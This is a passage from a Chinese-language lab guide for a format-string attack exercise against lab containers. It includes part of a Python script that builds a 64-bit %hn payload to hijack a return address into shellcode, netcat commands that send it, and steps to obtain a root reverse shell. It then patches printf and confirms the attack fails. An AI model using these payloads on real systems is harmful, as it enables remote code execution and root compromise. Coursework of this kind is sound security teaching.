        prefix, suffix, init = sc + pad1, b'', len(sc) + len(pad1)
        layout, sc_addr = 'A(shellcode在buf开头)', buf
    else:                                               # 布局B: shellcode 放末尾
        prefix, suffix, init = b'', sc, 0
        layout, sc_addr = 'B(shellcode放末尾)', None

    addrs = [struct.pack('<Q', slot + 2 * i) for i in range(3)]
    check_addrs(addrs)
    writes = plan_words(vals, init)

    idxs = [0, 0, 0]
    for _ in range(10):
        parts, prev = [], init
        for w, cur in writes:
            if cur > prev:
                parts.append(f"%1${cur - prev}c".encode())
            parts.append(f"%{idxs[w]}$hn".encode())
            prev = cur
        fmt  = b''.join(parts)
        off  = len(prefix) + len(fmt)
        pad2 = b'A' * ((8 - off % 8) % 8)
        base = N8 + (off + len(pad2)) // 8
        new  = [base, base + 1, base + 2]
        if new == idxs:
            break
        idxs = new

    payload = prefix + fmt + pad2 + b''.join(addrs) + suffix
    assert len(payload) <= 1500, len(payload)
    open('task3_payload.bin', 'wb').write(payload)
    if sc_addr is None:
        sc_addr = buf + len(prefix) + len(fmt) + len(pad2) + 24   # 布局B: 地址之后
    print(f'布局: {layout}, shellcode @ {sc_addr:#018x} ({len(sc)}B)')
    print(f'返回地址槽 = FP+8 = {slot:#018x} -> 改写为 {sc_addr:#018x}')
    print('写入计划: ' + ', '.join(f'w{w}={vals[w]:#06x} count={c}' for w, c in writes))
    print(f'参数序号: {idxs}, payload={len(payload)}B')
    if '--rshell' in sys.argv:
        print('先在 10.9.0.1 开监听: nc -nv -l 9090')
    print('发送: cat task3_payload.bin | nc -w 3 10.9.0.6 9090')

main()
```

> 布局 B 中写入的值 = `sc_addr`（shellcode 实际地址），脚本按布局自动计算；布局 A 时 `sc_addr = buf`。

### 4.5 执行与预期结果（📸 L3-12 ~ L3-13）

**先跑固定命令版**：

```bash
python3 task3_inject.py <BUF64> <FP64> <N8> sc64.bin
cat task3_payload.bin | nc -w 3 10.9.0.6 9090
```

**预期**（容器控制台）：`Returned from printf()` 笑脸之后出现 `ls -l` 列表 + `Hello` + `passwd` 尾行；`(after)` 行缺失。

**再拿反弹 shell**：

```bash
# 终端A (10.9.0.1): nc -nv -l 9090
python3 task3_inject.py <BUF64> <FP64> <N8> sc64.bin --rshell 10.9.0.1
cat task3_payload.bin | nc -w 3 10.9.0.6 9090
```

**预期**（终端 A）：`Connection received …` → 敲 `id` 得 `uid=0(root)`、`hostname` 得 `server-10.9.0.6` → **64 位服务器 root shell 达成**。

**📸 L3-12**：`task3_inject.py` 打印的布局/序号/写入计划（证明 NULL 字节处理方式）+ 固定命令版容器输出。
**📸 L3-13**：64 位反弹 shell 的 `nc` 窗口（回连 + `id` + `hostname`）。

> Apple Silicon 注：若在 M 系列 Mac 上做（容器全是 64 位），Task 1/2 即在 64 位程序上完成，本节可跳过——我们是 x86_64，**照做**。

### 4.6 Task 3 报告要点

- NULL 字节问题的本质与你的解法（4.1 的 5 点）；
- `%k$.Nx` 直接寻址如何让你"把参数指针自由前后移动"（引用 PDF 第 5 页示例代码）；
- 32 位 vs 64 位差异表（可直接放进报告）；
- 64 位 root 反弹 shell 截图 + 解释。

---

## 5. Task 4：修复漏洞（📸 L3-14 ~ L3-15）

### 5.1 修改源码并对比编译警告

```bash
cd ~/Labsetup/server-code
cp format.c format.c.bak

# 1) 先重现 Lab 2 时的警告（留作对比素材）
touch format.c
make 2>&1 | tee make_before.txt
grep -c format-security make_before.txt      # 预期 1

# 2) 修复: printf(msg) -> printf("%s", msg)
sed -i 's/printf(msg);/printf("%s", msg);/' format.c
#   或手动编辑 myprintf() 里那一行
grep -n 'printf' format.c                   # 确认只剩 printf("%s", msg);

# 3) 重新编译, 警告应消失
make clean >/dev/null 2>&1
make 2>&1 | tee make_after.txt
grep -c format-security make_after.txt       # 预期 0  <- 警告消失
```

**预期**：

- `make_before.txt` 含：
  ```
  format.c:33:5: warning: format not a string literal and no format arguments [-Wformat-security]
      33 |     printf(msg);
  ```
- `make_after.txt` **没有**任何 `format-security` 警告，编译成功。

**📸 L3-14**：修复后的 `format.c` 关键行（`printf("%s", msg);`）+ 两次 `grep -c`（1 → 0）或 make 输出对比。

### 5.2 重建容器并验证攻击失效

```bash
cd ~/Labsetup/server-code
make install
cd ~/Labsetup
docker-compose build        # 必须重建! Dockerfile 是 COPY 二进制
docker-compose up -d
docker logs -f server-10.9.0.5     # 新终端开着

# 重新做基线(容器重启 -> 所有地址都变了)
echo hello | nc -w 3 10.9.0.5 9090        # 记录新的 TARGET / BUF / FP

# 用新地址重发 Task 1 的 3.A payload
python3 task1_write.py <新TARGET> <N> 0x4d2 task1_3a.bin   # N 通常不变, 可复用
cat task1_3a.bin | nc -w 3 10.9.0.5 9090
```

**应该得到的结果**（容器控制台）：

```
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | %1$1234c%NN$n          <- 格式串被当作普通字符串原样打印!
server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)
server-10.9.0.5 | The target variable's value (after): 0x11223344    <- 攻击失效
```

判定：`printf("%s", msg)` 把用户输入当**数据**输出，`%n` 根本不被解析 → `(after)` 保持初值。（可选加测：Lab 2 的 `%s`×200 崩溃 payload 也不再崩溃。）

**📸 L3-15**：修复后攻击重放的完整输出（重点标出 `(after): 0x11223344` 不变）。

### 5.3 Task 4 报告必答三问

1. **警告含义**：`[-Wformat-security] "format not a string literal and no format arguments"` —— gcc 在编译期发现 `printf` 的格式串不是字符串常量且无附加参数，即格式串完全由用户输入控制 → CWE-134 的典型特征；它是最直接的编译期防护提示。
2. **警告是否消失**：改成 `printf("%s", msg)` 后格式串变成常量、用户输入降级为普通数据 → 警告消失（附 `grep -c`/make 对比截图）。
3. **攻击是否还有效**：无效——重放 3.A（或任意一个攻击），`(after)` 保持 `0x11223344`，格式串原样打印（附截图）。
4. （加分讨论）局限：`-Wformat-security` 只在编译期提示这一种模式；安全编码的关键是**永远不要把用户数据当格式串**（`printf("%s", s)` / `fputs(s, stdout)`），同时可提 `-Wformat`、`-Wformat=2` 等更强选项。

---

## 6. 截图清单（报告用，按顺序编号）

| 编号 | 内容 | 证明点 |
| --- | --- | --- |
| L3-01 | `dockps` 两容器 + `randomize_va_space`=0 | 环境就绪 |
| L3-02 | `exploit.py` 中 shellcode 部分 | 官方 shellcode 已定位 |
| L3-03 | 10.9.0.5 基线 hello 完整输出（BUF/TARGET/FP + 笑脸） | 正常行为 + 记录地址 |
| L3-04 | N 探针：`deadbeef` 片段 + `N = xx` | 32 位偏移标定 |
| L3-05 | Task 3.A：脚本命令 + `(after): 0x000004d2` | 任意值改写成功 |
| L3-06 | Task 3.B：`(after): 0x00005000` | 精确值改写成功 |
| L3-07 | Task 3.C：`(after): 0xaabbccdd`（+ 写入计划行） | 大值分半字写成功 |
| L3-08 | `calc_q12.py` 输出（①②③ 地址 + %x 计数） | Q1/Q2 作答依据 |
| L3-09 | Task 2 固定命令：容器输出 ls/Hello/passwd + `(after)` 消失 | 代码注入成功 |
| L3-10 | Task 2 反弹 shell：`nc -l` 回连 + `id`(uid=0) + `hostname` | 远程 root shell |
| L3-11 | 10.9.0.6 基线输出 + N8 探针结果 | 64 位地址/偏移标定 |
| L3-12 | `task3_inject.py` 布局/序号/写入计划 + 固定命令版输出 | NULL 字节解法 + 64 位注入 |
| L3-13 | 64 位反弹 shell `nc` 窗口（`id`/`hostname`=server-10.9.0.6） | 64 位 root shell |
| L3-14 | 修复源码行 + 警告对比（`grep -c` 1→0） | 编译警告含义与消除 |
| L3-15 | 修复后重放 3.A：`(after): 0x11223344` 不变 | 攻击被中和（补丁验证） |
| L3-16 | （可选）修复后 `%s`×200 也不再崩溃 | 补丁对 DoS 类攻击同样有效 |

---

## 7. 报告撰写指引

每个 Task 固定结构：**目的（一句话）→ 关键代码（贴脚本并逐段解释）→ 执行命令与截图 → 观察结果 + 解释**。

必须覆盖的讨论点：

1. **Q1 / Q2**：三个标记地址的推导公式 + 实测值 + `%x` 计数（附 L3-08）。
2. **Figure 1 标注**：shellcode 具体地址（Input buffer 地址）写在图上（L3-09 辅助）。
3. **格式串构造解释**（Task 1、2、3 各一段）：初始计数、`%1$Wc` 补数、`%k$hn` 序号、地址放末尾的原因。
4. **Task 1**：`%n` vs `%hn` 与 2^32/2^16 的可行性；完整性（integrity）被破坏。
5. **Task 2**：shellcode 逐段结构（48B 机器码 + 字符串 + `*` 占位 + argv 指针硬编码 → 命令长度不可变）；反弹 shell 原理（`nc -l`、`/dev/tcp`、`0<&1`、`2>&1`，对应 PDF Section 5）。
6. **Task 3**：NULL 字节问题本质 + 你的解法（4.1 五点）；`%k$.Nx` 自由移动指针技巧；32/64 位差异。
7. **Task 4**：警告含义、修复方式、警告消失、攻击失效（三问答全）。
8. **CIA 三性贯穿**：Lab2 = 可用性+保密性；Lab3 = **完整性 + 代码执行/权限**；修复 = 恢复安全属性。
9. 解释"有趣/意外"的观察（笑脸为何还在、`(after)` 为何消失、坏字节导致的偶发失败等）。

---

## 8. 排错与注意事项

| 现象 | 原因与处理 |
| --- | --- |
| `nc` 端什么都看不到 | 正常！结果全在**容器控制台**（`docker logs -f server-10.9.0.5`） |
| `nc` 不退出 | 正常，`Ctrl+C`；或加 `-w 3` |
| Task 1 的 `(after)` 没变 | ① N 错/地址错 → 重跑基线+探针；② 地址在首个 `0x00` 前含 `0x25` → `docker-compose down && up` 换地址重记；③ payload 超 1500 → 脚本已 assert |
| `(after)` 变成了奇怪的值 | `%n` 写到了错位置 → N 或对齐算错，检查脚本打印的"地址参数序号" |
| 崩溃（无笑脸） | `%n`/`%hn` 写坏地址（序号错、地址含%）；子进程崩溃不影响 server，改对了重发即可 |
| Task 2 无 shellcode 输出 | ① `FP+4` 记错 → 重看基线；② 序号/对齐错 → 看脚本输出；③ 栈不可执行 → 确认 Makefile 仍有 `-z execstack` 并重建；④ 计数初始值不对 → 确认 shellcode 恰好 137B、无 `%`/`0x00` |
| 反弹 shell 无回连 | ① 监听没先开 / 不在 10.9.0.1 上；② 命令串长度变了（`*` 位置必须在下标 59）；③ 用的是 `bash` 的 `/dev/tcp`，确认命令原文无改动 |
| 64 位 payload 无效 | N8 是否用 `server-10.9.0.6` 测的；地址必须 8 字节对齐放末尾；`FP+8`；w0~w2 三个写入是否都在 |
| 64 位地址含 `%` | `dcdown && dcup` 重启换地址后重跑 1.5/4.2 |
| 改了源码攻击仍成功 | 忘了 `make install && docker-compose build && docker-compose up`（Dockerfile 是 COPY，不重建不生效） |
| 容器重启后所有脚本报错 | 地址全变 → 重跑 1.4/1.5 基线；N 一般不变但建议复测 |
| 日志太长找不到结果 | `docker logs server-10.9.0.5 2>&1 \| grep "value (after)"` 或按 `Got a connection` 分段看最后一次 |

---

## 9. 执行顺序与时间估算（检查清单）

- [ ] **环境（30–60 min）**：1.1 ASLR → 1.2 容器 → 1.3 exploit.py → 1.4/1.5 双基线记地址 → 1.6 测 N → 截图 L3-01~04
- [ ] **Task 1（60–90 min）**：3.A → 3.B → 3.C（理解 `%hn` 分半字）→ 截图 L3-05~07
- [ ] **Task 2（2–3 h）**：3.1 算 Q1/Q2 → 3.4 固定命令注入 → 3.5 反弹 shell → Figure 1 标注 → 截图 L3-08~10
- [ ] **Task 3（2–3 h）**：4.2 测 N8 → 4.3 提取 64 位 shellcode → 4.5 固定命令版 → 反弹 shell → 截图 L3-11~13
- [ ] **Task 4（45 min）**：改码 → 警告对比 → 重建 → 重放攻击失效 → 截图 L3-14~15
- [ ] **报告（2–3 h）**：按第 7 节结构整理代码、截图、解释，覆盖全部必答点

**总预计：8–12 小时**（不含报告为 5–8 小时）。Due **Oct 10**，建议按"环境+Task1 / Task2 / Task3 / Task4+报告"分成 4 个半天执行。

---

## 附录 A：脚本速查

| 脚本 | 作用 | 用法 |
| --- | --- | --- |
| `probe32.py` / `probe64.py` | 生成 N / N8 标定探针 | `python3 probe32.py` |
| `findN.py` | 从容器日志数出 N | `python3 findN.py [容器] [标记]` |
| `calc_q12.py` | 算 ①②③ 地址与 %x 计数 | `python3 calc_q12.py <BUF> <FP> <N>` |
| `task1_write.py` | 通用写内存（自动选 %n / 双 %hn） | `python3 task1_write.py <TARGET> <N> <值> <out>` |
| `task2_inject.py` | 32 位注入 + 反弹 shell | `python3 task2_inject.py <BUF> <FP> <N> [--rshell IP]` |
| `gen_sc64.py` | 导出 64 位 shellcode | `python3 gen_sc64.py` |
| `task3_inject.py` | 64 位注入 + 反弹 shell（自动布局 A/B） | `python3 task3_inject.py <BUF64> <FP64> <N8> sc64.bin [--rshell IP]` |

## 附录 B：统一发送与验证命令

```bash
# 发送 (二选一)
cat <payload> | nc -w 3 10.9.0.5 9090      # 32 位目标
cat <payload> | nc -w 3 10.9.0.6 9090      # 64 位目标

# 查看最近一次结果
docker logs server-10.9.0.5 2>&1 | tail -8

# 反弹 shell 监听 (攻击者 10.9.0.1)
nc -nv -l 9090
```

**关键数字速记**（32 位默认 shellcode）：shellcode=137B；命令字段=60B（`*` 在下标 59）；默认命令 50+9 空格；反弹命令 47+12 空格；3.C 共打印 52445 字符；3.B 打印 20480 字符；3.A 打印 1234 字符。
